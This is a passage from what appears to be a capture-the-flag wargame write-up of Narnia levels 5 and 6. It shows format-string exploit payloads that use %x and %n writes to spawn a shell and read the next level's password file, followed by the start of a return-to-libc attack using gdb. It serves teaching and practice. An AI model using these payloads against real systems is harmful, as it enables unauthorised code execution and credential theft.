&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv){&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;64&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;

	&lt;span style=&#34;color: #f8f8f2&#34;&gt;snprintf(buffer,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer[&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(buffer)&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Change i&amp;#39;s value from 1 -&amp;gt; 500. &amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;

	&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(i&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;500&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;){&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;GOOD&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;system(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

	&lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;No way...let me give you a hint!&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;buffer : [%s] (%d)&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;strlen(buffer));&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;printf&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;i = %d (%p)&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i,&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;i);&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;

&lt;p&gt;A fixed sized buffer again. This time however trying to overflow it in order to
write to &lt;code&gt;i&lt;/code&gt; won&amp;rsquo;t work. If we look at line 9 and lookup the manpage for &lt;code&gt;snprintf&lt;/code&gt;
we see that&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;The  functions  snprintf() and vsnprintf() write at most size bytes
(including the trailing null byte (&#39;\0&#39;)) to str.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So we won&amp;rsquo;t be able to overflow this buffer. Going through the usual possible exploits
we&amp;rsquo;ve only really go one more to try: &lt;a href=&#34;https://en.wikipedia.org/wiki/Uncontrolled_format_string&#34;&gt;format string attack&lt;/a&gt; or
&lt;em&gt;uncontrolled format string vulnerability&lt;/em&gt;. This happens when user input
isn&amp;rsquo;t checked, and allows the user to use format characters (&lt;code&gt;%s&lt;/code&gt;, &lt;code&gt;%x&lt;/code&gt;) to read or
manipulate the stack.&lt;/p&gt;

&lt;p&gt;For me this is one of the harder exploits to understand, so this level is
great practice for me. So if it doesn&amp;rsquo;t make sense at first, stick with it and
try various strings. Hopefully you&amp;rsquo;ll grok it at some point.&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s check to see if our hunch is right. Using a few characters to start, I
then append a list of &lt;code&gt;%x&lt;/code&gt;, which read values from the stack and print them.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia5@melinda:/narnia$ ./narnia5 &lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;aaaa&amp;#39;+&amp;#39;%x&amp;#39;*10&amp;quot;`&lt;/span&gt;
Change i&amp;#39;s value from 1 -&amp;gt; 500. No way...let me give you a hint!
buffer : [aaaaf7eb75b6ffffffffffffd6aef7e2fbf8616161616265376636623537666] (63)
i = 1 (0xffffd6cc)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Sure enough we see the beginning of the input string after the 4th &lt;code&gt;%x&lt;/code&gt;. So we then
put the address if &lt;code&gt;i&lt;/code&gt; into that location like and shorten the number of &lt;code&gt;%x&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia5@melinda:/narnia$ ./narnia5 &lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;\xcc\xd6\xff\xff&amp;#39;+&amp;#39;%x&amp;#39;*5&amp;quot;`&lt;/span&gt;
Change i&amp;#39;s value from 1 -&amp;gt; 500. No way...let me give you a hint!
buffer : [����f7eb75b6ffffffffffffd6aef7e2fbf8ffffd6cc] (44)
i = 1 (0xffffd6cc)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now we have the address of &lt;code&gt;i&lt;/code&gt;, we use &lt;code&gt;%n&lt;/code&gt; to write to that address, remembering
to remove one &lt;code&gt;%x&lt;/code&gt; to keep the right length.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia5@melinda:/narnia$ ./narnia5 &lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;\xcc\xd6\xff\xff&amp;#39;+&amp;#39;%x&amp;#39;*4 + &amp;#39;%n&amp;#39;&amp;quot;`&lt;/span&gt;
Change i&amp;#39;s value from 1 -&amp;gt; 500. No way...let me give you a hint!
buffer : [����f7eb75b6ffffffffffffd6aef7e2fbf8] (36)
i = 36 (0xffffd6cc)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So we see that we&amp;rsquo;ve written the length of the string into &lt;code&gt;i&lt;/code&gt;. We already have
a value of 36, but we need 500. To achieve this we need to pad the string.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia5@melinda:/narnia$ ./narnia5 &lt;span style=&#34;color: #66d9ef&#34;&gt;$(&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;\xcc\xd6\xff\xff&amp;#39;+&amp;#39;%x&amp;#39;*3 + &amp;#39;%500d&amp;#39; + &amp;#39;%n&amp;#39;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;)&lt;/span&gt;
Change i&amp;#39;s value from 1 -&amp;gt; 500. No way...let me give you a hint!
buffer : [����f7eb75b6ffffffffffffd6ae                                   ] (63)
i = 528 (0xffffd6cc)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We&amp;rsquo;re &lt;em&gt;28&lt;/em&gt; over the target, so let&amp;rsquo;s reduce the padding&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia5@melinda:/narnia$ ./narnia5 &lt;span style=&#34;color: #66d9ef&#34;&gt;$(&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;\xcc\xd6\xff\xff&amp;#39;+&amp;#39;%x&amp;#39;*3 + &amp;#39;%472d&amp;#39; + &amp;#39;%n&amp;#39;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;)&lt;/span&gt;
Change i&amp;#39;s value from 1 -&amp;gt; 500. GOOD
$ whoami
narnia6
$ cat /etc/narnia_pass/narnia6
[password]
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h2 id=&#34;level-06:100abf89ce6a11fb3cfc3f5a51e9cb94&#34;&gt;Level 06&lt;/h2&gt;

&lt;p&gt;&lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;extern&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;environ;&lt;/span&gt;

&lt;span style=&#34;color: #75715e&#34;&gt;// tired of fixing values...&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;// - morla&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;get_sp&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;void&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
       &lt;span style=&#34;color: #f8f8f2&#34;&gt;__asm__(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;movl %esp,%eax&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n\t&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;
               &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;and $0xff000000, %eax&amp;quot;&lt;/span&gt;
               &lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[]){&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;b1[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;b2[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt;  &lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;fp)(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;))&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;puts,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i;&lt;/span&gt;

	&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(argc&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;!=&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;){&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;%s b1 b2&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

	&lt;span style=&#34;color: #75715e&#34;&gt;/* clear environ */&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(i&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;environ[i]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;NULL;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;memset(environ[i],&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;strlen(environ[i]));&lt;/span&gt;
	&lt;span style=&#34;color: #75715e&#34;&gt;/* clear argz    */&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(i&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[i]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;NULL;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;memset(argv[i],&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;strlen(argv[i]));&lt;/span&gt;

	&lt;span style=&#34;color: #f8f8f2&#34;&gt;strcpy(b1,argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;strcpy(b2,argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
	&lt;span style=&#34;color: #75715e&#34;&gt;//if(((unsigned long)fp &amp;amp; 0xff000000) == 0xff000000)&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(((&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;long&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)fp&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0xff000000&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;get_sp())&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;fp(b1);&lt;/span&gt;

	&lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;

&lt;p&gt;In this rather complicated looking listing we notice a few things:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;line 17 is a function pointer to &lt;code&gt;puts&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;line 33 calls the function &lt;code&gt;fp&lt;/code&gt; points to&lt;/li&gt;
&lt;li&gt;line 31 prevents &lt;code&gt;fp&lt;/code&gt; from pointing to anything in our frame&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The last lines means we need to point &lt;code&gt;fp&lt;/code&gt; to a call in a system library.
This is going to be a &lt;a href=&#34;https://en.wikipedia.org/wiki/Return-to-libc_attack&#34;&gt;ret to libc attack&lt;/a&gt;. We
need to find the location of the function we want to execute. We want a shell, so our
best option would be to execute &lt;code&gt;system(&#39;/bin/sh&#39;)&lt;/code&gt;. As luck would have it, &lt;code&gt;puts&lt;/code&gt; and
&lt;code&gt;system&lt;/code&gt; both have the same function definition: &lt;code&gt;int system(const char *command);&lt;/code&gt; and
&lt;code&gt;int puts(const char *s);&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s fire up gdb and figure out our addresses.
&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia6@melinda:/narnia$ gdb ./narnia6 -q
Reading symbols from ./narnia6...(no debugging symbols found)...done.
(gdb) disass main
Dump of assembler code for function main:
   0x08048559 &amp;lt;+0&amp;gt;:	push   %ebp
   0x0804855a &amp;lt;+1&amp;gt;:	mov    %esp,%ebp
   0x0804855c &amp;lt;+3&amp;gt;:	push   %ebx
   0x0804855d &amp;lt;+4&amp;gt;:	and    $0xfffffff0,%esp
   0x08048560 &amp;lt;+7&amp;gt;:	sub    $0x30,%esp

    &amp;lt;-- snip --&amp;gt;

   0x0804869b &amp;lt;+322&amp;gt;:	movl   $0xffffffff,(%esp)      
   0x080486a2 &amp;lt;+329&amp;gt;:	call   0x8048410 &amp;lt;exit@plt&amp;gt;
   0x080486a7 &amp;lt;+334&amp;gt;:	lea    0x20(%esp),%eax
   0x080486ab &amp;lt;+338&amp;gt;:	mov    %eax,(%esp)
   0x080486ae &amp;lt;+341&amp;gt;:	mov    0x28(%esp),%eax
   0x080486b2 &amp;lt;+345&amp;gt;:	call   *%eax                &amp;lt;-- calling *fp*
   0x080486b4 &amp;lt;+347&amp;gt;:	movl   $0x1,(%esp)
   0x080486bb &amp;lt;+354&amp;gt;:	call   0x8048410 &amp;lt;exit@plt&amp;gt;
End of assembler dump.

(gdb) break *0x080486b2
Breakpoint 1 at 0x80486b2
(gdb) r aaaaaaaabbbb ccccccccdddd
Starting program: /games/narnia/narnia6 aaaaaaaabbbb ccccccccdddd

Breakpoint 1, 0x080486b2 in main ()
(gdb) x/50wx $esp
0xffffd680:	0xffffd6a0	0xffffd8ac	0x00000021	0x08048712
0xffffd690:	0x00000003	0xffffd754	0x63636363	0x63636363
0xffffd6a0:	0x64646464	0x61616100	0x62626262	0x00000000
0xffffd6b0:	0x080486c0	0xf7fca000	0x00000000	0xf7e3ca63
0xffffd6c0:	0x00000003	0xffffd754	0xffffd764	0xf7feacea
0xffffd6d0:	0x00000003	0xffffd754	0xffffd6f4	0x08049978
0xffffd6e0:	0x08048290	0xf7fca000	0x00000000	0x00000000
0xffffd6f0:	0x00000000	0x32aaee13	0x0a932a03	0x00000000
0xffffd700:	0x00000000	0x00000000	0x00000003	0x08048450
0xffffd710:	0x00000000	0xf7ff0500	0xf7e3c979	0xf7ffd000
0xffffd720:	0x00000003	0x08048450	0x00000000	0x08048471
0xffffd730:	0x08048559	0x00000003	0xffffd754	0x080486c0
0xffffd740:	0x08048730	0xf7feb180
(gdb) p system
$&lt;span style=&#34;color: #f8f8f2&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;{&lt;/span&gt;&amp;lt;text variable, no debug info&amp;gt;&lt;span style=&#34;color: #f92672&#34;&gt;}&lt;/span&gt; 0xf7e62cd0 &amp;lt;system&amp;gt;
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x62626262 in ?? ()
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;What I did here was to disassemble the &lt;code&gt;main&lt;/code&gt; function and find out where
&lt;code&gt;fp&lt;/code&gt; is getting called, so that I can set a breakpoint on it. Then I
run the binary and inspect the stack before the call to &lt;code&gt;fp&lt;/code&gt;. What we see is
that &lt;code&gt;$esp&lt;/code&gt; points to &lt;code&gt;0xffffd6a0&lt;/code&gt;, which is where the last 4 values of
&lt;code&gt;b2&lt;/code&gt; are stored. This is also the argument that will be passed to the &lt;code&gt;fp&lt;/code&gt; call.
Function arguments are pushed onto the stack before a function is called. So
We want this to point to &lt;code&gt;/bin/sh&lt;/code&gt;, and we want &lt;code&gt;fp&lt;/code&gt; to point to &lt;code&gt;system&lt;/code&gt;. This is
the reason for the &lt;code&gt;p system&lt;/code&gt;, it tells us the location of &lt;code&gt;system&lt;/code&gt;.
Also note that our &lt;code&gt;segfault&lt;/code&gt; is showing us the last
4 digits of &lt;code&gt;b1&lt;/code&gt;. Perfect, I can use that to overwrite &lt;code&gt;fp&lt;/code&gt; with the address of
&lt;code&gt;system&lt;/code&gt; and I should be good to go.&lt;/p&gt;

&lt;p&gt;As this is a little more advanced, let&amp;rsquo;s go over the steps:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Get the address of the argument to whatever &lt;code&gt;fp&lt;/code&gt; points to&lt;/li&gt;
&lt;li&gt;Figure out how to overwrite that with our argument&lt;/li&gt;
&lt;li&gt;Get the address of &lt;code&gt;system&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Overwrite what &lt;code&gt;fp&lt;/code&gt; points to with &lt;code&gt;system&lt;/code&gt;&amp;rsquo;s address&lt;/li&gt;
